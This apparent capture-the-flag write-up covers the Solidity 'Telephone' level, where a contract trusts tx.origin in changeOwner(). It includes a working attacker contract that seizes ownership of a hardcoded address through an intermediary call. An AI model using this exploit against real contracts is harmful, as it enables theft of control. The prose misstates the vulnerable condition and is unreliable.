# Telephone

### Contract
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

# Solution
Use remix to deploy another contract that calls the changeOwner() function. This function will update the owner to the current sender as long as that address does not match the owner of the original deployed contract.

### Code Solution
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract HackTelephone {
    address currentSender;
    address hackedContract = 0x2cf987560a418C225056bd618eBeC5aac64851B5;
    
    constructor() {
        currentSender = msg.sender;
    }

    function hackTelephone() public {
        ITelephone(hackedContract).changeOwner(currentSender);
    }
}
```

# What I learned
1. Do not use information from the transaction to update owner. Even adding something like a require() before can assist in more security.
